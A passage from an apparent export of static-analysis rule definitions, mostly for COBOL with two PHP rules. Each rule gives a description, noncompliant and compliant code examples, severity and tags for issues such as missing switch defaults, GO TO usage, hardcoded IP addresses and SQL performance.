  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>","""switch"" statements should have ""default"" clauses",[],CRITICAL,"['cert', 'cwe', 'misra']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>The cyclomatic complexity of a class should not exceed a defined threshold. Complex code can perform poorly and will in any case be difficult to
understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",php:S1311,php,PHP,"<p>The cyclomatic complexity of a class should not exceed a defined threshold. Complex code can perform poorly and will in any case be difficult to
understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",Classes should not be too complex,"[{'key': 'max', 'defaultValue': '200', 'type': 'INTEGER'}]",CRITICAL,[],CODE_SMELL
2018-07-31T12:24:47+0200,"<p>Hardcoding an IP address into source code is a bad idea for several reasons:</p>
<ul>
  <li> it forces the same address to be used in every environment (dev, sys, qa, prod) </li>
  <li> it places the responsibility of setting the value to use in production on the shoulders of the developer </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, '8.8.8.8', 23);  // Noncompliant
</pre>
<h2>Exceptions</h2>
<ul>
  <li> No issue is reported for 127.0.0.1 because loopback is not considered as sensitive </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",php:S1313,php,PHP,"<p>Hardcoding an IP address into source code is a bad idea for several reasons:</p>
<ul>
  <li> it forces the same address to be used in every environment (dev, sys, qa, prod) </li>
  <li> it places the responsibility of setting the value to use in production on the shoulders of the developer </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, '8.8.8.8', 23);  // Noncompliant
</pre>
<h2>Exceptions</h2>
<ul>
  <li> No issue is reported for 127.0.0.1 because loopback is not considered as sensitive </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",Using hardcoded IP addresses is security-sensitive,[],MINOR,['cert'],SECURITY_HOTSPOT
2019-03-13T09:11:18+0100,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DIVIDE 5 BY DIVISOR GIVING QUOTIENT. *&gt; TODO ensure DIVISOR is not zero
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",cobol:S1135,cobol,COBOL,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DIVIDE 5 BY DIVISOR GIVING QUOTIENT. *&gt; TODO ensure DIVISOR is not zero
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""TODO"" tags",[],INFO,['cwe'],CODE_SMELL
2015-04-07T09:32:38+0200,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
   IF BAR = 4
*  Noncompliant: due to the nesting IF statement, we know that BAR = 4 here and so
*  what's the point of testing again that BAR = 4 ?
     IF FOO = ""a"" AND BAR = 4
       DISPLAY ""something""
     END-IF.
     ...
   END-IF
</pre>
<pre>
*  Noncompliant: by definition BAR is greater than 0 if BAR = 4,
*  so the condition BAR &gt; 0 should be removed
   IF BAR = 4 AND &gt; 0 THEN DISPLAY ""something"".
</pre>
<h2>Compliant Solution</h2>
<pre>
   IF BAR = 4
     IF FOO = ""a""
       DISPLAY ""something""
     END-IF.
     ...
   END-IF
</pre>
<pre>
   IF BAR = 4 THEN DISPLAY ""something"".
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",cobol:S2589,cobol,COBOL,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
   IF BAR = 4
*  Noncompliant: due to the nesting IF statement, we know that BAR = 4 here and so
*  what's the point of testing again that BAR = 4 ?
     IF FOO = ""a"" AND BAR = 4
       DISPLAY ""something""
     END-IF.
     ...
   END-IF
</pre>
<pre>
*  Noncompliant: by definition BAR is greater than 0 if BAR = 4,
*  so the condition BAR &gt; 0 should be removed
   IF BAR = 4 AND &gt; 0 THEN DISPLAY ""something"".
</pre>
<h2>Compliant Solution</h2>
<pre>
   IF BAR = 4
     IF FOO = ""a""
       DISPLAY ""something""
     END-IF.
     ...
   END-IF
</pre>
<pre>
   IF BAR = 4 THEN DISPLAY ""something"".
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Boolean expressions should not be gratuitous,[],MAJOR,"['cert', 'cwe', 'misra', 'redundant']",CODE_SMELL
2019-03-13T09:11:18+0100,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DIVIDE 5 BY DIVISOR GIVING QUOTIENT. *&gt; FIXME ensure DIVISOR is not zero
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",cobol:S1134,cobol,COBOL,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DIVIDE 5 BY DIVISOR GIVING QUOTIENT. *&gt; FIXME ensure DIVISOR is not zero
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Initializing a data item with a value of the wrong type will lead to runtime errors. The rule checks that numeric data items are not initialized
with alphanumeric/alphabetic values and that alphanumeric /alphabetic data items are not initialized with numeric values. </p>
<h2>Noncompliant Code Example</h2>
<pre>
       WORKING-STORAGE SECTION.
         EJECT
       01  TAB-POS.
           02  FILLER  PIC A(14) VALUE 0.  *&gt; Noncompliant
           02  FILLER  PIC 9(14) VALUE 'ASDFJKL;QWERTY'.  *&gt; Noncompliant

       01 MYGROUP PIC 9(1).
          88 X VALUE 1,2.
          88 Y VALUE 3, ""BLUE"".  *&gt; Noncompliant; BLUE is alphanumeric
</pre>
<h2>Compliant Solution</h2>
<pre>
       WORKING-STORAGE SECTION.
         EJECT
       01  TAB-POS.
           02  FILLER  PIC A(14)  VALUE 'ASDFJKL;QWERTY'.
           02  FILLER  PIC 9(14)  VALUE 0.

       01 MYGROUP PIC 9(1).
          88 X VALUE 1,2.
          88 Y VALUE 3, 4.
</pre>",cobol:COBOL.DataItemInitialValueCheck,cobol,COBOL,"<p>Initializing a data item with a value of the wrong type will lead to runtime errors. The rule checks that numeric data items are not initialized
with alphanumeric/alphabetic values and that alphanumeric /alphabetic data items are not initialized with numeric values. </p>
<h2>Noncompliant Code Example</h2>
<pre>
       WORKING-STORAGE SECTION.
         EJECT
       01  TAB-POS.
           02  FILLER  PIC A(14) VALUE 0.  *&gt; Noncompliant
           02  FILLER  PIC 9(14) VALUE 'ASDFJKL;QWERTY'.  *&gt; Noncompliant

       01 MYGROUP PIC 9(1).
          88 X VALUE 1,2.
          88 Y VALUE 3, ""BLUE"".  *&gt; Noncompliant; BLUE is alphanumeric
</pre>
<h2>Compliant Solution</h2>
<pre>
       WORKING-STORAGE SECTION.
         EJECT
       01  TAB-POS.
           02  FILLER  PIC A(14)  VALUE 'ASDFJKL;QWERTY'.
           02  FILLER  PIC 9(14)  VALUE 0.

       01 MYGROUP PIC 9(1).
          88 X VALUE 1,2.
          88 Y VALUE 3, 4.
</pre>",Data items should be initialized with data of the correct type,[],BLOCKER,[],BUG
2019-03-13T09:11:18+0100,"<p>Some COBOL compilers such as IBM one will assume that the minimum value of <code>OCCURS DEPENDING ON</code> is 1 but nothing is enforcing that and
this behaviour can change or be different when using another compiler.</p>
<p>Setting the minimum value of <code>OCCURS DEPENDING ON</code> makes the code more readable, and less dependent on compiler.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01 MY-TABLE-COUNT PIC S9(4) BINARY.
01 MY-TABLE.
   03 MY-ITEM OCCURS 500 TIMES          *&gt; Noncompliant
       DEPENDING ON MY-TABLE-COUNT.
      05 MY-FIELD-01 PIC X(08).
      05 MY-FIELD-02 PIC 9(05).
</pre>
<h2>Compliant Solution</h2>
<pre>
01 MY-TABLE-COUNT PIC S9(4) BINARY.
01 MY-TABLE.
   03 MY-ITEM OCCURS 1 TO 500 TIMES          *&gt; Compliant; minimum value is 1
       DEPENDING ON MY-TABLE-COUNT.
      05 MY-FIELD-01 PIC X(08).
      05 MY-FIELD-02 PIC 9(05).
</pre>",cobol:S4882,cobol,COBOL,"<p>Some COBOL compilers such as IBM one will assume that the minimum value of <code>OCCURS DEPENDING ON</code> is 1 but nothing is enforcing that and
this behaviour can change or be different when using another compiler.</p>
<p>Setting the minimum value of <code>OCCURS DEPENDING ON</code> makes the code more readable, and less dependent on compiler.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01 MY-TABLE-COUNT PIC S9(4) BINARY.
01 MY-TABLE.
   03 MY-ITEM OCCURS 500 TIMES          *&gt; Noncompliant
       DEPENDING ON MY-TABLE-COUNT.
      05 MY-FIELD-01 PIC X(08).
      05 MY-FIELD-02 PIC 9(05).
</pre>
<h2>Compliant Solution</h2>
<pre>
01 MY-TABLE-COUNT PIC S9(4) BINARY.
01 MY-TABLE.
   03 MY-ITEM OCCURS 1 TO 500 TIMES          *&gt; Compliant; minimum value is 1
       DEPENDING ON MY-TABLE-COUNT.
      05 MY-FIELD-01 PIC X(08).
      05 MY-FIELD-02 PIC 9(05).
</pre>","""OCCURS DEPENDING ON"" should be used with a minimum value",[],MAJOR,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>TRANSFORM</code> statement is only supported by OS/VS COBOL, and should be replaced by the <code>INSPECT CONVERTING</code> statement to
prevent portability issues.</p>",cobol:COBOL.TransformStatementCheck,cobol,COBOL,"<p>The <code>TRANSFORM</code> statement is only supported by OS/VS COBOL, and should be replaced by the <code>INSPECT CONVERTING</code> statement to
prevent portability issues.</p>","The OS/VS ""TRANSFORM"" statement should not be used",[],MAJOR,['lock-in'],CODE_SMELL
2016-12-09T10:13:20+0100,"<p>When the size of a variable-length table is <code>DEPENDING ON</code> a non-<code>BINARY</code>/<code>COMP</code> variable, use of that table is
inefficient because a conversion must be done every time the table is used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01 VARS
    05 TABLE_SIZE   PIC 9(4).
    05 MY_TABLE OCCURS 1 TO 10
                        DEPENDING ON TABLE_SIZE  *&gt; Noncompliant; TABLE-SIZE isn't BINARY or COMP
                        PIC X(10).
</pre>
<h2>Compliant Solution</h2>
<pre>
01 VARS
    05 TABLE_SIZE   PIC 9(4) BINARY.
    05 MY_TABLE OCCURS 1 TO 10
                        DEPENDING ON TABLE_SIZE
                        PIC X(10).
</pre>",cobol:S3671,cobol,COBOL,"<p>When the size of a variable-length table is <code>DEPENDING ON</code> a non-<code>BINARY</code>/<code>COMP</code> variable, use of that table is
inefficient because a conversion must be done every time the table is used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01 VARS
    05 TABLE_SIZE   PIC 9(4).
    05 MY_TABLE OCCURS 1 TO 10
                        DEPENDING ON TABLE_SIZE  *&gt; Noncompliant; TABLE-SIZE isn't BINARY or COMP
                        PIC X(10).
</pre>
<h2>Compliant Solution</h2>
<pre>
01 VARS
    05 TABLE_SIZE   PIC 9(4) BINARY.
    05 MY_TABLE OCCURS 1 TO 10
                        DEPENDING ON TABLE_SIZE
                        PIC X(10).
</pre>","""BINARY"" variables should be used to declare variable-length table sizes",[],MAJOR,['performance'],CODE_SMELL
2019-03-13T09:11:18+0100,"<p><code>PERFORM</code> is used to execute a paragraph located somewhere in the program and then, once executed, the execution flow will continue on
the line following the PERFORM statement. This is the expected behaviour that can be broken if a <code>GO TO</code> is added in the called paragraph.
When mixing <code>PERFORM</code> and <code>GO TO</code> you can quickly be lost on the execution flow and finally don't get the one you expect. For
this reason, calling <code>PERFORM</code> with paragraphs that used <code>GO TO</code> should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
PROCEDURE DIVISION.
DISPLAY-9-LETTERS.
    PERFORM ABC.
    DISPLAY ""END OF DISPLAY-9-LETTERS"".
    STOP RUN.

    ABC.
        DISPLAY ""ABC"".
        GO TO XYZ.

    DEF.
        DISPLAY ""DEF"".

    XYZ.
        DISPLAY ""XYZ"".
</pre>
<h2>Compliant Solution</h2>
<pre>
PROCEDURE DIVISION.
DISPLAY-9-LETTERS.
    PERFORM ABC.
    PERFORM DEF.
    PERFORM XYZ.
    DISPLAY ""END OF DISPLAY-9-LETTERS"".
    STOP RUN.

    ABC.
        DISPLAY ""ABC"".

    DEF.
        DISPLAY ""DEF"".

    XYZ.
        DISPLAY ""XYZ"".
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://queenofcobol.com/perform-vs-go-to/"">Queen of COBOL</a> - Perform vs Go To </li>
</ul>",cobol:S4884,cobol,COBOL,"<p><code>PERFORM</code> is used to execute a paragraph located somewhere in the program and then, once executed, the execution flow will continue on
the line following the PERFORM statement. This is the expected behaviour that can be broken if a <code>GO TO</code> is added in the called paragraph.
When mixing <code>PERFORM</code> and <code>GO TO</code> you can quickly be lost on the execution flow and finally don't get the one you expect. For
this reason, calling <code>PERFORM</code> with paragraphs that used <code>GO TO</code> should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
PROCEDURE DIVISION.
DISPLAY-9-LETTERS.
    PERFORM ABC.
    DISPLAY ""END OF DISPLAY-9-LETTERS"".
    STOP RUN.

    ABC.
        DISPLAY ""ABC"".
        GO TO XYZ.

    DEF.
        DISPLAY ""DEF"".

    XYZ.
        DISPLAY ""XYZ"".
</pre>
<h2>Compliant Solution</h2>
<pre>
PROCEDURE DIVISION.
DISPLAY-9-LETTERS.
    PERFORM ABC.
    PERFORM DEF.
    PERFORM XYZ.
    DISPLAY ""END OF DISPLAY-9-LETTERS"".
    STOP RUN.

    ABC.
        DISPLAY ""ABC"".

    DEF.
        DISPLAY ""DEF"".

    XYZ.
        DISPLAY ""XYZ"".
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://queenofcobol.com/perform-vs-go-to/"">Queen of COBOL</a> - Perform vs Go To </li>
</ul>","Paragraphs used by a ""PERFORM"" statement should not contain ""GO TO""",[],CRITICAL,['pitfall'],BUG
2015-04-07T09:32:38+0200,"<p>Conditional statements using a condition which cannot be anything but <code>FALSE</code> have the effect of making blocks of code non-functional.
If the condition cannot evaluate to anything but <code>TRUE</code>, the conditional statement is completely redundant, and makes the code less
readable.</p>
<p>It is quite likely that the code does not match the programmer's intent.</p>
<p>Either the condition should be removed or it should be updated so that it does not always evaluate to <code>TRUE</code> or <code>FALSE</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
IF FOO IS NUMERIC AND FOO = ""a""   *&gt; Noncompliant, FOO cannot be both numeric and equal to ""a""
  DISPLAY ""...""
END-IF.

IF BAR = 4
  IF FOO = ""a"" AND BAR = 5        *&gt; Noncompliant, BAR cannot be equal to 5
    DISPLAY ""...""
  END-IF.
  ...
END-IF.

01 BAR PIC 9.
IF BAR &gt; 30                       *&gt; Noncompliant, BAR cannot be greater than 9
  DISPLAY ""...""
END-IF.
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",cobol:S2583,cobol,COBOL,"<p>Conditional statements using a condition which cannot be anything but <code>FALSE</code> have the effect of making blocks of code non-functional.
If the condition cannot evaluate to anything but <code>TRUE</code>, the conditional statement is completely redundant, and makes the code less
readable.</p>
<p>It is quite likely that the code does not match the programmer's intent.</p>
<p>Either the condition should be removed or it should be updated so that it does not always evaluate to <code>TRUE</code> or <code>FALSE</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
IF FOO IS NUMERIC AND FOO = ""a""   *&gt; Noncompliant, FOO cannot be both numeric and equal to ""a""
  DISPLAY ""...""
END-IF.

IF BAR = 4
  IF FOO = ""a"" AND BAR = 5        *&gt; Noncompliant, BAR cannot be equal to 5
    DISPLAY ""...""
  END-IF.
  ...
END-IF.

01 BAR PIC 9.
IF BAR &gt; 30                       *&gt; Noncompliant, BAR cannot be greater than 9
  DISPLAY ""...""
END-IF.
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>","Conditions should not unconditionally evaluate to ""TRUE"" or to ""FALSE""",[],MAJOR,"['cert', 'cwe', 'misra', 'pitfall', 'unused']",BUG
2019-03-13T09:11:18+0100,"<p>This rule is a more precise version of <a href='/coding_rules#rule_key=cobol%3AS1308'>S1308</a> preventing the use of <code>GO TO</code>. The flow of a program is already complicated to
understand with simple <code>GO TO</code>s. It's even worse when a <code>GO TO</code> is executed conditionally like this is the case with <code>GO TO
DEPENDING ON</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
PROCEDURE DIVISION.
   ...
   GO TO PARAGRAPH-10
         PARAGRAPH-20
         PARAGRAPH-30
   DEPENDING ON WS-PARA-NUMBER *&gt; Noncompliant
   ...
</pre>
<h2>Compliant Solution</h2>
<pre>
PROCEDURE DIVISION.
   ...
   EVALUATE WS-PARA-NUMBER
      WHEN 1
         PERFORM PARAGRAPH-10
      WHEN 2
         PERFORM PARAGRAPH-20
      WHEN 3
         PERFORM PARAGRAPH-30
      WHEN OTHER
         PERFORM PARAGRAPH-99
   END-EVALUATE
   ...
</pre>",cobol:S4883,cobol,COBOL,"<p>This rule is a more precise version of {rule:cobol:S1308} preventing the use of <code>GO TO</code>. The flow of a program is already complicated to
understand with simple <code>GO TO</code>s. It's even worse when a <code>GO TO</code> is executed conditionally like this is the case with <code>GO TO
DEPENDING ON</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
PROCEDURE DIVISION.
   ...
   GO TO PARAGRAPH-10
         PARAGRAPH-20
         PARAGRAPH-30
   DEPENDING ON WS-PARA-NUMBER *&gt; Noncompliant
   ...
</pre>
<h2>Compliant Solution</h2>
<pre>
PROCEDURE DIVISION.
   ...
   EVALUATE WS-PARA-NUMBER
      WHEN 1
         PERFORM PARAGRAPH-10
      WHEN 2
         PERFORM PARAGRAPH-20
      WHEN 3
         PERFORM PARAGRAPH-30
      WHEN OTHER
         PERFORM PARAGRAPH-99
   END-EVALUATE
   ...
</pre>","""GO TO DEPENDING ON"" should not be used",[],CRITICAL,[],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>If you do not explicitly close a cursor, it will be closed at the end of the task. But if you try to re-open this cursor to process it, you will
get an error. That is why a cursor should be explicitly closed after it has been processed.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/459.html"">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>",cobol:SQL.CursorOpenedMustBeClosedCheck,cobol,COBOL,"<p>If you do not explicitly close a cursor, it will be closed at the end of the task. But if you try to re-open this cursor to process it, you will
get an error. That is why a cursor should be explicitly closed after it has been processed.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/459.html"">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>",Explicitly opened cursors should be closed,[],MINOR,"['cwe', 'sql']",BUG
2013-06-19T07:34:52+0200,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that logical file names conform to a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Given the regular expression <code>FILE-.*</code>:</p>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT Y27MVTS       ASSIGN  TO     S1       &gt;Noncompliant
                          FILE STATUS IS FS-S1.
</pre>
<h2>Compliant Solution</h2>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT FILE-X345      ASSIGN  TO     S1
                          FILE STATUS IS FS-S1.
</pre>",cobol:COBOL.LogicalFileNamingCheck,cobol,COBOL,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that logical file names conform to a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Given the regular expression <code>FILE-.*</code>:</p>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT Y27MVTS       ASSIGN  TO     S1       &gt;Noncompliant
                          FILE STATUS IS FS-S1.
</pre>
<h2>Compliant Solution</h2>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT FILE-X345      ASSIGN  TO     S1
                          FILE STATUS IS FS-S1.
</pre>",Logical files should follow a naming convention,"[{'key': 'regexPatternString', 'htmlDesc': 'A regular expression to specify the logical file naming convention', 'defaultValue': '.*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2013-10-08T11:22:37+0200,"<p>SQL queries that use <code>EXISTS</code> subqueries are inefficient because the subquery is re-run for every row in the outer query's table. There
are more efficient ways to write most queries, ways that do not use the <code>EXISTS</code> condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT e.name
FROM employee e
WHERE EXISTS (SELECT * FROM department d WHERE e.department_id = d.id AND d.name = 'Marketing')
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT e.name
FROM employee e INNER JOIN department d
  ON e.department_id = d.id AND d.name = 'Marketing'
</pre>",cobol:S1138,cobol,COBOL,"<p>SQL queries that use <code>EXISTS</code> subqueries are inefficient because the subquery is re-run for every row in the outer query's table. There
are more efficient ways to write most queries, ways that do not use the <code>EXISTS</code> condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT e.name
FROM employee e
WHERE EXISTS (SELECT * FROM department d WHERE e.department_id = d.id AND d.name = 'Marketing')
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT e.name
FROM employee e INNER JOIN department d
  ON e.department_id = d.id AND d.name = 'Marketing'
</pre>",SQL EXISTS subqueries should not be used,[],MAJOR,"['performance', 'sql']",CODE_SMELL
2019-03-13T09:11:18+0100,"<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SET NAME TO NAME.    *&gt; Noncompliant
MOVE NAME TO NAME.   *&gt; Noncompliant
COMPUTE NAME = NAME. *&gt; Noncompliant
EXEC SQL
  UPDATE PERSON
    SET NAME = NAME  -- Noncompliant
  WHERE ID = :PERSON_ID
END-EXEC.
</pre>
<h2>Compliant Solution</h2>
<pre>
SET NAME TO NEW_NAME.
MOVE NEW_NAME TO NAME.
COMPUTE NAME = NEW_NAME.
EXEC SQL
  UPDATE PERSON
    SET NAME = :NEW_NAME
  WHERE ID = :PERSON_ID
END-EXEC.
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",cobol:S1656,cobol,COBOL,"<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SET NAME TO NAME.    *&gt; Noncompliant
MOVE NAME TO NAME.   *&gt; Noncompliant
COMPUTE NAME = NAME. *&gt; Noncompliant
EXEC SQL
  UPDATE PERSON
    SET NAME = NAME  -- Noncompliant
  WHERE ID = :PERSON_ID
END-EXEC.
</pre>
<h2>Compliant Solution</h2>
<pre>
SET NAME TO NEW_NAME.
MOVE NEW_NAME TO NAME.
COMPUTE NAME = NEW_NAME.
EXEC SQL
  UPDATE PERSON
    SET NAME = :NEW_NAME
  WHERE ID = :PERSON_ID
END-EXEC.
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Variables should not be self-assigned,[],MAJOR,['cert'],BUG
2013-06-19T07:34:52+0200,"<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>",cobol:COBOL.ParsingErrorCheck,cobol,COBOL,"<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>",Track parsing failures,[],MAJOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Using <code>GROUP BY</code> in SQL <code>SELECT</code> statements should be avoided because it makes queries complex. Complex queries are generally
not performant and are difficult to understand and therefore to maintain.</p>",cobol:SQL.GroupByUsageCheck,cobol,COBOL,"<p>Using <code>GROUP BY</code> in SQL <code>SELECT</code> statements should be avoided because it makes queries complex. Complex queries are generally
not performant and are difficult to understand and therefore to maintain.</p>","""GROUP BY"" should not be used in SQL ""SELECT"" statements",[],MAJOR,"['brain-overload', 'performance', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>When using <code>CICS XCTL</code> or <code>CICS LINK</code>, it is a bad practice not to specify the length of the communication area.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  EXEC CICS LINK PROGRAM ('SPI2TCV') COMMAREA (SPI-PARMCICS)  RESP (WS-RESP)  *&gt; Noncompliant

  EXEC CICS XCTL PROGRAM ('P4DERROR') COMMAREA (Y4DERROR)  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
  EXEC CICS LINK PROGRAM ('SPI2TCV') COMMAREA (SPI-PARMCICS) LENGTH (SPI-LONG) RESP (WS-RESP)

